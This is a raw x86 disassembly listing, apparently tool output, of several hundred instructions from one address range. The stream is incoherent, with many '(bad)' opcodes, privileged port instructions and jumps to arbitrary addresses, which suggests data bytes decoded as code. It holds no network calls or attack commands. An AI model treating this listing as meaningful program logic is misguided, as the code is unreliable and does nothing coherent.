  421dc5:	shl    BYTE PTR [eax-0x3cbdc581],cl
  421dcb:	les    eax,FWORD PTR [ecx-0x364c53e5]
  421dd1:	add    eax,0xa262bd56
  421dd6:	ja     0x421dd0
  421dd8:	mov    esp,0xeb6a4237
  421ddd:	jmp    FWORD PTR [edi]
  421ddf:	xor    DWORD PTR [ebx-0x64],esi
  421de2:	int3   
  421de3:	mov    esp,0x135f1cdc
  421de8:	push   0x7cfd1a60
  421ded:	fstp   QWORD PTR [edi-0x2c484f1]
  421df3:	clc    
  421df4:	sub    al,0xdb
  421df7:	ins    DWORD PTR es:[edi],dx
  421df8:	jb     0x421db0
  421dfa:	push   ecx
  421dfb:	sub    eax,0x31303ccd
  421e00:	and    bh,BYTE PTR [edx]
  421e02:	popa   
  421e03:	lods   al,BYTE PTR ds:[esi]
  421e04:	mov    bh,0x5f
  421e06:	outs   dx,BYTE PTR ds:[esi]
  421e07:	mov    esp,0x187bec8d
  421e0c:	pop    ebx
  421e0d:	fst    DWORD PTR [edx+0x15e0ccc]
  421e13:	mov    ds:0xd56f1533,eax
  421e18:	xor    edi,eax
  421e1a:	hlt    
  421e1b:	lea    ecx,[edi+ebp*1+0x4be2f2f5]
  421e22:	push   esp
  421e23:	shl    BYTE PTR [edx-0x45bb24e9],cl
  421e29:	ret    0x9be6
  421e2c:	inc    esp
  421e2d:	cmp    al,0xb2
  421e2f:	out    0xde,al
  421e31:	or     BYTE PTR [eax+0x26],0x17
  421e35:	cld    
  421e36:	push   ebp
  421e37:	popa   
  421e38:	aaa    
  421e39:	push   eax
  421e3a:	and    BYTE PTR [edx+ebp*8],dh
  421e3d:	sub    eax,DWORD PTR [ecx+0x29]
  421e40:	not    BYTE PTR [ebx+0x56efbf2c]
  421e46:	sbb    DWORD PTR [esi-0x61],edx
  421e49:	or     al,0x53
  421e4b:	call   0x112a:0x476aa19b
  421e52:	pcmpeqd mm0,QWORD PTR [ecx-0xb369879]
  421e59:	sub    BYTE PTR [edx+edi*2+0x7029d5d0],al
  421e60:	stc    
  421e61:	mov    esi,0x95fe884e
  421e66:	ret    0xc524
  421e69:	sub    cl,al
  421e6b:	cmp    ah,BYTE PTR [ebx]
  421e6d:	enter  0xf1af,0xcb
  421e71:	mov    ds:0xc829c140,eax
  421e76:	loopne 0x421ee9
  421e78:	cli    
  421e79:	(bad)  
  421e7a:	xchg   DWORD PTR [ecx-0x3bbb9521],ebp
  421e80:	pop    ss
  421e81:	xchg   BYTE PTR [eax+0x180ac1b],bh
  421e87:	dec    edi
  421e88:	retf   
  421e89:	jge    0x421e9e
  421e8b:	jb     0x421ef9
  421e8d:	sub    ebp,ebx
  421e8f:	xchg   esi,eax
  421e90:	pop    ds
  421e91:	mov    esi,0x8094e051
  421e96:	xor    BYTE PTR [edx],dh
  421e98:	xchg   bh,al
  421e9a:	loop   0x421ea7
  421e9c:	lods   al,BYTE PTR ds:[esi]
  421e9d:	mov    edx,DWORD PTR [edx]
  421e9f:	ret    0x9b48
  421ea2:	xor    al,0x22
  421ea4:	sbb    DWORD PTR [esi-0x35],esp
  421ea7:	mov    dh,0xc
  421ea9:	(bad)  
  421eaa:	shl    eax,cl
  421eac:	out    0xf3,eax
  421eae:	mov    ch,0x97
  421eb0:	jae    0x421f15
  421eb2:	push   cs
  421eb3:	scas   al,BYTE PTR es:[edi]
  421eb4:	(bad)  
  421eb5:	or     DWORD PTR [eax-0x5],ecx
  421eb8:	outs   dx,BYTE PTR ds:[esi]
  421eb9:	push   eax
  421eba:	sub    al,0x5
  421ebc:	iret   
  421ebd:	mov    edi,0xb94129ee
  421ec2:	les    eax,FWORD PTR [esi+ebx*1]
  421ec5:	jne    0x421f40
  421ec7:	ins    BYTE PTR es:[edi],dx
  421ec8:	pusha  
  421ec9:	sub    BYTE PTR [ecx],bl
  421ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ecc:	xor    bh,0x45
  421ecf:	jae    0x421ef7
  421ed1:	xlat   BYTE PTR ds:[ebx]
  421ed2:	or     al,0xd5
  421ed4:	xchg   DWORD PTR [ecx+0x7e],eax
  421ed7:	dec    ecx
  421ed8:	out    dx,al
  421ed9:	dec    esi
  421eda:	push   esi
  421edb:	outs   dx,BYTE PTR ds:[esi]
  421edc:	jmp    0xb1db9f9b
  421ee1:	dec    ebp
  421ee2:	loope  0x421e8b
  421ee4:	dec    edx
  421ee5:	(bad)  
  421ee6:	sbb    BYTE PTR [edi],ah
  421ee8:	or     eax,0x487b2cd6
  421eed:	jno    0x421f3e
  421eef:	sbb    al,0x1c
  421ef1:	push   ds
  421ef2:	xchg   esi,eax
  421ef3:	push   es
  421ef4:	setno  BYTE PTR [ebx]
  421ef7:	mov    bh,BYTE PTR [ebp+0x57d7f682]
  421efd:	call   0x7ab9c45c
  421f02:	div    eax
  421f04:	pusha  
  421f05:	push   esp
  421f06:	cmp    al,0xdd
  421f08:	sahf   
  421f09:	jl     0x421f89
  421f0b:	mov    esi,es
  421f0d:	mov    DWORD PTR [ebx+0x7fdeab11],ebp
  421f13:	pop    ebp
  421f14:	fstp   DWORD PTR [ecx]
  421f16:	and    ch,BYTE PTR [ebp+0x1c]
  421f19:	daa    
  421f1a:	sub    bh,BYTE PTR [ebx]
  421f1c:	stos   BYTE PTR es:[edi],al
  421f1d:	test   ah,al
  421f1f:	adc    ebx,esi
  421f21:	stos   BYTE PTR es:[edi],al
  421f22:	push   esi
  421f23:	cld    
  421f24:	scas   eax,DWORD PTR es:[edi]
  421f25:	dec    ebp
  421f26:	mov    bh,0xf6
  421f28:	cli    
  421f29:	add    eax,0x4f2cb7db
  421f2e:	mov    esp,0xc9d39718
  421f33:	cmp    al,0xb0
  421f35:	sbb    al,ch
  421f37:	int3   
  421f38:	push   edi
  421f39:	sbb    eax,0xc30a82e2
  421f3e:	in     eax,dx
  421f3f:	ror    ebp,1
  421f41:	pop    ss
  421f42:	push   ecx
  421f43:	(bad)  
  421f44:	dec    ecx
  421f45:	cmp    BYTE PTR [eax+edi*1],ah
  421f48:	les    ecx,FWORD PTR [ebp-0x72]
  421f4b:	test   ecx,0xd0fd5c57
  421f51:	retf   0xd9b7
  421f54:	push   ds
  421f55:	pop    ecx
  421f56:	outs   dx,BYTE PTR cs:[esi]
  421f58:	push   eax
  421f59:	dec    edx
  421f5a:	ja     0x421fc2
  421f5c:	ret    
  421f5d:	inc    ecx
  421f5e:	mov    ecx,0x2b480bcb
  421f63:	mov    eax,ds:0x3c564a22
  421f68:	out    0xf4,al
  421f6a:	sub    DWORD PTR [edx-0x66],ebp
  421f6d:	ds inc esp
  421f6f:	sub    eax,0x89385aea
  421f74:	sbb    DWORD PTR [edx+0x313d183a],0x7df95971
  421f7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f7f:	gs xchg edx,eax
  421f81:	ret    
  421f82:	push   edi
  421f83:	cwde   
  421f84:	or     eax,0x66bd1160
  421f89:	pop    ecx
  421f8a:	int    0x5f
  421f8c:	test   eax,ebx
  421f8e:	sahf   
  421f8f:	mov    eax,ds:0x23789d82
  421f94:	jbe    0x421f8f
  421f96:	shl    DWORD PTR [ecx+0x5c],0x7b
  421f9a:	pop    eax
  421f9b:	add    BYTE PTR [esp+ecx*8+0x27],dl
  421f9f:	cli    
  421fa0:	add    al,0x99
  421fa2:	(bad)  
  421fa3:	mov    BYTE PTR [edi-0x521d2a47],dl
  421fa9:	out    dx,eax
  421faa:	ss mov dl,0x3
  421fad:	push   esi
  421fae:	xor    edi,edx
  421fb0:	adc    cl,al
  421fb2:	mov    edi,0x8c7fac49
  421fb7:	xor    BYTE PTR [edx-0x1a92790a],dl
  421fbd:	mov    WORD PTR [edi+0x76587489],fs
  421fc3:	sbb    ecx,DWORD PTR ds:0x8c62fdb0
  421fc9:	icebp  
  421fca:	and    BYTE PTR [edi-0x19],ch
  421fcd:	mov    dh,0xd9
  421fcf:	out    dx,al
  421fd0:	mov    edx,0x8dfe092c
  421fd5:	fnstenv [edi+ecx*4-0x7a3925c5]
  421fdc:	fidivr WORD PTR [edx+0x642352f2]
  421fe2:	sbb    BYTE PTR [ebx],ch
  421fe4:	fistp  WORD PTR [ecx-0x2e]
  421fe7:	inc    esp
  421fe8:	fs sahf 
  421fea:	fld    QWORD PTR [esi]
  421fec:	xor    al,0xa4
  421fee:	push   ecx
  421fef:	push   edx
  421ff0:	and    eax,0x12c5fca7
  421ff5:	and    DWORD PTR [eax+0x14],esi
  421ff8:	push   es
  421ff9:	jmp    0xb49e:0x3b984c4b
  422000:	inc    ebx
  422001:	jmp    0x421f98
  422003:	pop    es
  422004:	jo     0x42200b
  422006:	fdivr  QWORD PTR [edi]
  422008:	cmp    al,0xf8
  42200a:	cmp    esi,DWORD PTR [esi+0x4203860e]
  422010:	xor    al,0xed
  422012:	mov    ds:0xdc58619d,eax
  422017:	mov    esi,0x8e256671
  42201c:	rol    DWORD PTR [edx-0x3c47aabb],0xfe
  422023:	mov    ebp,DWORD PTR [eax+0x73]
  422026:	sub    dh,BYTE PTR [edx]
  422028:	aad    0x3c
  42202a:	ins    DWORD PTR es:[edi],dx
  42202b:	mov    ds:0x6bbff15f,eax
  422030:	cmp    BYTE PTR [ebp+0x414ae61f],dl
  422036:	in     al,0xfa
  422038:	jle    0x42204a
  42203a:	jmp    0x42200b
  42203c:	fwait
  42203d:	sti    
  42203e:	pop    edx
  42203f:	ins    DWORD PTR es:[edi],dx
  422040:	or     BYTE PTR [esp+ebp*2+0x5fca30a4],bl
  422047:	fdiv   DWORD PTR [esi-0x53]
  42204a:	leave  
  42204b:	add    BYTE PTR [eax+0xf5505b0],dh
  422051:	adc    al,0x57
  422053:	xchg   ecx,eax
  422054:	pop    ebx
  422055:	into   
  422056:	dec    eax
  422057:	inc    esi
  422058:	mov    ds:0x5ad3c07e,al
  42205d:	sbb    bl,bl
  42205f:	arpl   WORD PTR [esi+eax*4],cx
  422062:	mov    eax,0xde59663e
  422067:	cld    
  422068:	retf   
  422069:	and    ch,BYTE PTR [ebx-0x63e7cb08]
  42206f:	jmp    0xdb596d4b
  422074:	xchg   esi,eax
  422075:	rcl    DWORD PTR [ebx],0x78
  422078:	mov    eax,0x16d5a002
  42207d:	mov    dl,0x48
  42207f:	mov    eax,ds:0x9d860913
  422084:	sbb    DWORD PTR [eax],0x50
  422087:	cwde   
  422088:	jne    0x422090
  42208a:	push   esp
  42208b:	(bad)
  42208e:	and    eax,0x31634d43
  422093:	push   edi
  422094:	aas    
  422095:	mov    ebp,0x70b83748
  42209a:	mov    eax,DWORD PTR [esp+esi*2]
  42209d:	push   esp
  42209e:	pop    edx
  42209f:	push   ss
  4220a0:	sub    DWORD PTR [ebx],0xd28cb14
  4220a6:	fidiv  WORD PTR [ebx+0x17]
  4220a9:	dec    edi
  4220aa:	mov    eax,0x11108ea1
  4220af:	ret    
  4220b0:	push   0x16
  4220b2:	mul    DWORD PTR [ebx+0x7f]
  4220b5:	mov    ds:0x20ad07f0,eax
  4220ba:	mov    ah,0xa1
  4220bc:	fidiv  DWORD PTR [ebx+eax*1]
  4220bf:	(bad)  
  4220c0:	mov    ebp,0xfff88c61
  4220c5:	mov    edx,?
  4220c7:	cdq    
  4220c8:	xchg   esp,eax
  4220c9:	sub    BYTE PTR [esi+edx*2],dl
  4220cc:	pop    ebp
  4220cd:	dec    ebp
  4220ce:	pop    ss
  4220cf:	push   0xffffffff
  4220d1:	cmp    BYTE PTR [edi],0x56
  4220d4:	mov    dh,0xed
  4220d6:	cdq    
  4220d7:	mov    dh,BYTE PTR [ebx]
  4220d9:	mov    ecx,0xcbf73991
  4220de:	xor    bh,al
  4220e0:	xchg   edi,eax
  4220e1:	arpl   WORD PTR [ecx],di
  4220e3:	xor    DWORD PTR [esi+0x37e9e15e],esi
  4220e9:	shr    dh,0x49
  4220ec:	push   esp
  4220ed:	iret   
  4220ee:	fcomp  QWORD PTR [esi+eiz*4-0x29b072c6]
  4220f5:	(bad)  
  4220f6:	xchg   ebp,eax
  4220f7:	popf   
  4220f8:	add    DWORD PTR [eax+0x8],0x44dc69e9
  4220ff:	and    al,BYTE PTR [ecx]
  422101:	dec    esi
  422102:	popa   
  422103:	mov    esp,0xd970aafe
  422108:	mov    dl,0x40
  42210a:	test   eax,0x6de85f52
  42210f:	pop    ss
  422110:	rcr    BYTE PTR [eax+0x56],cl
  422113:	sahf   
  422114:	jo     0x422138
  422116:	shr    DWORD PTR [esp+ebp*4],1
  422119:	pusha  
  42211a:	jb     0x4220cd
  42211c:	mov    ds,esp
  42211e:	sbb    eax,0xb3cc6c7e
  422123:	mov    dl,0x7d
  422125:	fistp  WORD PTR [ebp+0x7e35d4ae]
  42212b:	add    eax,0x17c81fd
  422130:	inc    ebx
  422131:	dec    edx
  422132:	aas    
  422133:	(bad)  
  422134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422135:	in     al,dx
  422136:	jne    0x422179
  422138:	xchg   BYTE PTR [edi+0x29222e7a],ch
  42213e:	xchg   ecx,eax
  42213f:	in     eax,dx
  422140:	(bad)  
  422142:	rcl    BYTE PTR [esi-0x18],cl
  422145:	xchg   ebp,eax
  422146:	ret    0x665e
  422149:	mov    dl,BYTE PTR [edx]
  42214b:	mov    gs,edi
  42214d:	or     BYTE PTR [ecx-0x23551f41],dh
  422153:	xchg   ebx,eax
  422154:	cmp    DWORD PTR [ebp-0x303586e],0x75e1c70f
  42215e:	sub    eax,0x8cac098d
  422163:	cmp    al,0x30
  422165:	inc    ebx
  422166:	outs   dx,DWORD PTR ds:[esi]
  422167:	mov    ds:0x286c1979,eax
  42216c:	mov    ds:0xbdef5c9e,eax
  422171:	sahf   
  422172:	adc    esp,DWORD PTR [edx-0x2f]
  422175:	xor    DWORD PTR [ebx-0x4a],ebx
  422178:	adc    BYTE PTR [eax+0x297f6d5e],bh
  42217e:	sbb    eax,0x1a415483
  422183:	bound  esp,QWORD PTR [ebp+0x63299654]
  422189:	(bad)  
  42218a:	xlat   BYTE PTR ds:[ebx]
  42218b:	pushf  
  42218c:	ficomp WORD PTR [edx+0x32fc5633]
  422192:	getsec 
  422194:	in     eax,0x62
  422196:	pop    es
  422197:	add    al,0x81
  422199:	fwait
  42219a:	sahf   
  42219b:	xchg   edx,eax
  42219c:	lock popf 
  42219e:	shr    DWORD PTR [ebp+0x1f],cl
  4221a1:	mov    dh,0x70
  4221a3:	jmp    0x716b9008
  4221a8:	imul   edx,DWORD PTR [edi],0xffffffb5
  4221ab:	out    dx,al
  4221ac:	shl    ecx,1
  4221ae:	(bad)  
  4221af:	ins    DWORD PTR es:[edi],dx
  4221b0:	out    0x42,eax
  4221b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221b3:	sbb    ah,BYTE PTR [esi-0x1456850b]
  4221b9:	(bad)  
  4221ba:	mov    ah,0x7d
  4221bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221bd:	fimul  DWORD PTR gs:[ecx+0x41ddadea]
  4221c4:	jbe    0x42220a
  4221c6:	ret    
  4221c7:	dec    ebp
  4221c8:	mov    ch,0xff
  4221ca:	sahf   
  4221cb:	adc    DWORD PTR [ebp-0x4e48d2e2],edi
  4221d1:	or     DWORD PTR [esp+edx*4],esi
  4221d4:	fnsetpm(287 only) 
  4221d6:	ror    ah,0x44
  4221d9:	test   esi,edx
  4221db:	pushf  
  4221dc:	out    dx,eax
  4221dd:	je     0x422226
  4221df:	dec    esp
  4221e0:	into   
  4221e1:	mov    al,0x92
  4221e3:	jnp    0x4221b3
  4221e5:	(bad)  
  4221e6:	leave  
  4221e7:	pusha  
  4221e8:	pop    esp
  4221e9:	retf   0xe0f6
  4221ec:	hlt    
  4221ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221ee:	scas   eax,DWORD PTR es:[edi]
  4221ef:	push   0x2bc70f77
  4221f4:	out    dx,al
  4221f5:	icebp  
  4221f6:	pushf  
  4221f7:	xor    BYTE PTR ds:0xa52ea705,ch
  4221fd:	mov    dh,0xa0
  4221ff:	mov    esi,0x8882fda5
  422204:	jmp    0x2f9c:0xba63fd8b
  42220b:	outs   dx,BYTE PTR ds:[esi]
  42220c:	js     0x42227a
  42220e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42220f:	xchg   ecx,eax
  422210:	or     al,0xe
  422212:	dec    DWORD PTR [ebx+0x3eed328f]
  422218:	or     al,BYTE PTR [ebx-0x59]
  42221b:	mov    ebp,0x8b26a740
  422220:	repnz lahf 
  422222:	stc    
  422223:	or     ebp,DWORD PTR [eax]
  422225:	outs   dx,BYTE PTR ds:[esi]
  422226:	sti    
  422227:	inc    eax
  422228:	iret   
  422229:	mov    eax,0x95f80f78
  42222e:	xchg   esp,eax
  42222f:	stc    
  422230:	or     BYTE PTR [eax],al
  422232:	test   ebx,esi
  422234:	xor    ah,BYTE PTR [ebx+esi*8+0x58]
  422238:	ds inc esp
  42223a:	ficom  WORD PTR [edi+0x1c]
  42223d:	in     al,0xc5
  42223f:	(bad)  
  422240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422241:	sbb    al,0xbd
  422243:	xchg   esp,eax
  422245:	jg     0x422258
  422247:	sbb    ebx,DWORD PTR [edx+0x7632a8d6]
  42224d:	or     bh,BYTE PTR [ebp-0x25f4e2f2]
  422253:	xor    DWORD PTR [ebx+0x9],edx
  422256:	jmp    esi
  422258:	dec    ebp
  422259:	push   edx
  42225a:	enter  0x447c,0x91
  42225e:	mov    gs,WORD PTR [eax-0x3492491f]
  422264:	cmp    dh,BYTE PTR [eax+0x6d]
  422267:	mov    ds:0x336f3597,al
  42226c:	sar    DWORD PTR [esi],1
  42226e:	sub    ebx,DWORD PTR [ebx]
  422270:	shl    DWORD PTR [ebx-0x11],0x3f
  422274:	jne    0x4222da
  422276:	data16 into 
  422278:	push   edx
  422279:	pop    eax
  42227a:	iret   
  42227b:	xchg   ebx,eax
  42227c:	push   esp
  42227d:	call   0xa185:0x9b73360d
  422284:	xchg   esi,eax
  422285:	(bad)  
  422286:	repnz fidiv DWORD PTR [eax]
  422289:	(bad)  
  42228a:	jne    0x422251
  42228c:	jmp    0x10a3acfb
  422291:	mov    eax,0xef3c0a8c
  422296:	sbb    al,0x4a
  422298:	mov    al,ds:0x12f346d0
  42229d:	popf   
  42229e:	push   ebx
  42229f:	xor    esi,DWORD PTR [edi-0x63]
  4222a2:	js     0x422235
  4222a4:	inc    edx
  4222a5:	imul   edx,ebp,0x379756a8
  4222ab:	out    0x0,al
  4222ad:	fstp   QWORD PTR [esi-0x68076d0]
  4222b3:	dec    edi
  4222b4:	ss xor eax,0x2698d36e
  4222ba:	in     eax,dx
  4222bb:	xor    eax,0xfcf051d7
  4222c0:	push   esi
  4222c1:	dec    esi
  4222c2:	jne    0x4222b7
  4222c4:	stos   DWORD PTR es:[edi],eax
  4222c5:	frstor [ecx-0xa2b0436]
  4222cb:	adc    BYTE PTR [eax-0x7d052a3b],0x91
  4222d2:	fisubr WORD PTR [edi+0x12998060]
  4222d8:	cmp    eax,DWORD PTR [ebp-0x9]
  4222db:	nop
  4222dc:	cs jle 0x42233b
  4222df:	sub    eax,0x570f611f
  4222e4:	and    BYTE PTR ds:0x525f8c93,0xbd
  4222eb:	jns    0x4222cb
  4222ed:	dec    ebp
  4222ee:	ja     0x422323
  4222f0:	jle    0x422272
  4222f2:	call   0xb76c:0xc73bbbf1
  4222f9:	push   eax
  4222fa:	int3   
  4222fb:	fwait
  4222fc:	addr16 xchg ebx,eax
  4222fe:	cmp    edx,eax
  422300:	push   0x14
  422302:	add    eax,edx
  422304:	jmp    0x42233b
  422306:	mov    DWORD PTR [esi-0x3b],0xd28b578e
  42230d:	inc    eax
  42230e:	mov    bl,0x27
  422310:	ins    BYTE PTR es:[edi],dx
  422311:	call   0xd40651d0
  422316:	test   al,bl
  422318:	out    dx,eax
  422319:	not    eax
  42231b:	out    0xfb,al
  42231d:	jmp    0x2be01c39
  422322:	icebp  
  422323:	ret    0xab7f
  422326:	lods   eax,DWORD PTR ds:[esi]
  422327:	jns    0x42236e
  422329:	and    DWORD PTR [edx+0x4b],esp
  42232c:	sti    
  42232d:	jge    0x422301
  42232f:	sub    ebp,edx
  422331:	leave  
  422332:	scas   al,BYTE PTR es:[edi]
  422333:	sti    
  422334:	shl    BYTE PTR ds:0xde095608,1
  42233a:	cmp    DWORD PTR [ebx],edi
  42233c:	sahf   
  42233d:	in     al,0x4c
  42233f:	shl    DWORD PTR [ebp+0x641141af],0xa4
  422346:	mov    fs,WORD PTR [edx]
  422348:	mov    bh,0x7e
  42234a:	(bad)  
  42234b:	jbe    0x422330
  42234d:	nop
  42234e:	push   ss
  42234f:	imul   DWORD PTR [ebx+0x7465c8a3]
  422355:	arpl   sp,dx
  422357:	mov    edx,0x9464c3af
  42235c:	mov    ebp,0x25727a92
  422361:	pop    ebp
  422362:	call   0x6893bb9b
  422367:	rol    BYTE PTR [ebp+edx*8-0x4b],1
  42236b:	bound  esi,QWORD PTR [eax-0x45]
  42236e:	or     ecx,edx
  422370:	adc    DWORD PTR cs:[esi+edi*1],edx
  422374:	sbb    eax,0xea9b7c90
  422379:	cdq    
  42237a:	mov    dl,0xd8
  42237c:	test   al,0xbd
  42237e:	data16 (bad) 
  422380:	fcomp  st(3)
  422382:	inc    ecx
  422383:	mov    cs,WORD PTR [esi+0x3e]
  422386:	das    
  422387:	mov    eax,0x7907d21c
  42238c:	mov    ebp,0xc5208fd0
  422391:	xor    DWORD PTR ds:0x68324911,edx
  422397:	inc    edx
  422398:	(bad)  
  42239b:	in     eax,0x6f
  42239d:	(bad)  
  42239f:	push   ebp
  4223a0:	mul    BYTE PTR [edi+0x7419136d]
  4223a6:	xchg   ecx,eax
  4223a7:	or     BYTE PTR [eax-0x581651f8],al
  4223ad:	adc    al,0xc1
  4223af:	push   edx
  4223b0:	(bad)  
  4223b1:	imul   edx,DWORD PTR es:[esi+edx*1],0x26
  4223b6:	pop    eax
  4223b7:	ror    BYTE PTR [ecx],0xdb
  4223ba:	loopne 0x4223cb
  4223bc:	push   eax
  4223bd:	jmp    0x4219:0xd6149feb
  4223c4:	je     0x422440
  4223c6:	sti    
  4223c7:	add    DWORD PTR [ecx-0x78c72aa8],0xfffffff2
  4223ce:	cmp    eax,DWORD PTR [edx]
  4223d0:	cmp    eax,0x1a6fc102
  4223d5:	xchg   ebx,eax
  4223d6:	mov    ebp,esi
  4223d8:	aam    0x18
  4223da:	sti    
  4223db:	out    dx,al
  4223dc:	jl     0x42241f
  4223de:	xchg   esp,eax
  4223df:	loope  0x4223a6
  4223e1:	imul   bp,bx,0x865d
  4223e6:	retfw  
  4223e8:	adc    BYTE PTR [ebx],0x93
  4223eb:	pop    ebp
  4223ec:	in     al,dx
  4223ed:	stos   BYTE PTR es:[edi],al
  4223ee:	ja     0x42242d
  4223f0:	test   dh,dl
  4223f2:	add    eax,0x85d9db1b
  4223f7:	loopne 0x4223ab
  4223f9:	xchg   esi,eax
  4223fa:	mov    dl,0x8e
  4223fc:	(bad)  
  4223fd:	xor    esi,DWORD PTR [edi-0x5ef385c2]
  422403:	out    dx,eax
  422404:	repz push es
  422406:	imul   edi,DWORD PTR [edx+0x10],0x4c3e7f32
  42240d:	xchg   DWORD PTR [esi],edi
  42240f:	enter  0xc18c,0x4d
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	leave  
  422415:	iret   
  422416:	cli    
  422417:	in     eax,dx
  422418:	push   ebx
  422419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42241a:	fidiv  DWORD PTR [ebx+ecx*1+0x2a1d9251]
  422421:	icebp  
  422422:	push   esi
  422423:	and    cl,BYTE PTR [edi-0x6f630b8]
  422429:	dec    ebx
  42242a:	and    edi,DWORD PTR [edi-0x58]
  42242d:	hlt    
  42242e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242f:	inc    edi
  422430:	sub    dl,dl
  422432:	in     eax,dx
  422433:	adc    DWORD PTR [ebp+0x48f6aa6],0x31f5ef50
  42243d:	inc    esi
  42243e:	repnz cli 
  422440:	add    dl,ch
  422442:	dec    ecx
  422443:	popa   
  422444:	je     0x4224ad
  422446:	push   edi
  422447:	mov    dl,0x65
  422449:	stos   DWORD PTR es:[edi],eax
  42244a:	test   esp,0xaf2f167e
  422450:	sbb    al,0x78
  422452:	cli    
  422453:	xchg   edx,eax
  422454:	push   0x6d
  422456:	push   edi
  422457:	ret    
  422458:	daa    
  422459:	outs   dx,DWORD PTR ds:[esi]
  42245a:	dec    eax
  42245b:	push   edx
  42245c:	mov    cl,0xd0
  42245e:	push   0xffffffa6
  422460:	mov    ds:0x9b9a5105,al
  422465:	fld    QWORD PTR [eax+0x6b]
  422468:	pop    ebp
  422469:	or     ebx,DWORD PTR [ebx-0x4660e9da]
  42246f:	push   es
  422470:	or     al,0xb8
  422472:	cwde   
  422473:	stos   BYTE PTR es:[edi],al
  422474:	jge    0x422451
  422476:	and    eax,DWORD PTR [esi+0x5231b11]
  42247c:	mov    edi,0x72e68b84
  422481:	addr16 push es
  422483:	pop    es
  422484:	jl     0x422498
  422486:	loopne 0x422412
  422488:	les    esi,FWORD PTR [ebx]
  42248a:	jmp    0x422469
  42248c:	arpl   bp,bx
  42248e:	mov    edx,0xc3ac322b
  422493:	or     bl,BYTE PTR [esi-0x28]
  422496:	into   
  422497:	sbb    ch,cl
  422499:	stos   DWORD PTR es:[edi],eax
  42249a:	and    edx,0x9b6897f2
  4224a0:	out    dx,al
  4224a1:	test   eax,0x9fe9e4a1
  4224a6:	lods   eax,DWORD PTR ds:[esi]
  4224a7:	cdq    
  4224a8:	mov    esp,0x9e031fe1
  4224ad:	adc    ebp,esi
  4224af:	outs   dx,BYTE PTR ds:[esi]
  4224b0:	add    BYTE PTR [edi+esi*8+0x4fa15a1b],dl
  4224b7:	mov    ah,0x36
  4224b9:	add    DWORD PTR [eax+esi*1-0x5c8cb0c5],edi
  4224c0:	dec    esi
  4224c1:	cmp    DWORD PTR [eax],esi
  4224c3:	pop    ebp
  4224c4:	pop    ebp
  4224c5:	clc    
  4224c6:	ins    DWORD PTR es:[edi],dx
  4224c7:	xchg   edi,eax
  4224c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c9:	popf   
  4224ca:	call   0x4e8:0x8517e178
  4224d1:	in     eax,dx
  4224d2:	lahf   
  4224d3:	mov    dh,0x7b
  4224d5:	and    dh,BYTE PTR [edi-0x61]
  4224d8:	jnp    0x4224f8
  4224da:	push   ebp
  4224db:	and    ebp,edi
  4224dd:	cmp    DWORD PTR [edi],esi
  4224df:	pop    eax
  4224e0:	(bad)  
  4224e1:	mov    ebp,0xdfe63be1
  4224e6:	push   edx
  4224e7:	and    eax,0xf0c59347
  4224ec:	loope  0x42254a
  4224ee:	jmp    0xee302ea7
  4224f3:	ror    BYTE PTR [edi-0x28],0x77
  4224f7:	push   edi
  4224f8:	aad    0x83
  4224fa:	adc    eax,0x944f4e99
  4224ff:	jmp    0xb1c1:0x7298f60c
  422506:	(bad)  
  422507:	test   DWORD PTR [edi+0x56],edi
  42250a:	adc    DWORD PTR [ecx+0x3ab76a1],ebp
  422510:	xchg   ebp,eax
  422511:	inc    edi
  422512:	pop    edi
  422513:	loope  0x42252e
  422515:	dec    edx
  422516:	mov    edx,0x5a5a8ff
  42251b:	xor    al,0xba
  42251d:	or     cl,BYTE PTR [eax-0x14]
  422520:	or     ch,BYTE PTR [ecx-0x8ceb14]
  422526:	jae    0x4224b1
  422528:	mov    edx,0x592b306f
  42252d:	sub    DWORD PTR [eax-0x32dde8e5],eax
  422533:	adc    eax,0xb5bf897f
  422538:	fwait
  422539:	scas   al,BYTE PTR es:[edi]
  42253a:	lods   eax,DWORD PTR ds:[esi]
  42253b:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42253d:	add    DWORD PTR [edi-0x2b0a8401],edi
  422543:	mov    esi,0x54814f27
  422548:	mov    ebx,0x36472e05
  42254d:	aad    0x32
  42254f:	leave  
  422550:	fdivr  QWORD PTR [edx-0x204b4a85]
  422556:	pushf  
  422557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422558:	ret    
  422559:	pop    edi
  42255a:	mov    esi,0xfcb7c372
  42255f:	cmc    
  422560:	imul   DWORD PTR [ebx]
  422562:	xchg   ebx,eax
  422563:	scas   al,BYTE PTR es:[edi]
  422564:	lods   eax,DWORD PTR ds:[esi]
  422565:	cld    
  422566:	jl     0x422530
  422568:	mov    WORD PTR [bx-0x7c],ss
  42256c:	xchg   edx,eax
  42256d:	mov    DWORD PTR [esi],edx
  42256f:	loopne 0x42253c
  422571:	and    al,BYTE PTR [esi-0x714ae28b]
  422577:	cmp    BYTE PTR [eax+0x1e],0xf9
  42257b:	aaa    
  42257c:	inc    ebx
  42257d:	push   0x70584d01
  422582:	inc    ebx
  422583:	pusha  
  422584:	lods   al,BYTE PTR ds:[esi]
  422585:	pop    DWORD PTR [ebp+0x2]
  422588:	or     al,0x78
  42258a:	test   BYTE PTR [ecx-0x52ee8b22],al
  422590:	and    edi,eax
  422592:	adc    dh,BYTE PTR [edx+edx*8-0x6b7fadf6]
  422599:	push   ss
  42259a:	test   eax,0x7c40bcb2
  42259f:	push   cs
  4225a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225a1:	push   ebp
  4225a2:	out    dx,al
  4225a3:	pop    esp
  4225a4:	mov    cl,0xa4
  4225a6:	sbb    ebp,DWORD PTR [edi]
  4225a8:	inc    ecx
  4225a9:	and    DWORD PTR [esi-0x35],edx
  4225ac:	fwait
